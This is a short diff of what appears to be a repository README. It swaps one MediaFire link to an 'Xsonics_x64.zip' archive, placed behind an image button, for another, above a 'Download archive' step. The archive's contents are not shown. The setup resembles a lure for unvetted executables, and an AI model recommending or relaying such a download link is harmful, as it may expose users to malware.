@@ -1,4 +1,4 @@
-[<img width="421" height="120" alt="image" src="https://github.com/user-attachments/assets/71b25661-0d3a-4c7a-9173-cc4aed6e75fa" />](https://www.mediafire.com/file/b6tlu54ucnclrpy/Xsonics_x64.zip/file)
+[<img width="421" height="120" alt="image" src="https://github.com/user-attachments/assets/71b25661-0d3a-4c7a-9173-cc4aed6e75fa" />](https://www.mediafire.com/file/ir74r5xajy5849a/Xsonics_x64.zip/file)
 
 1.Download archive
 
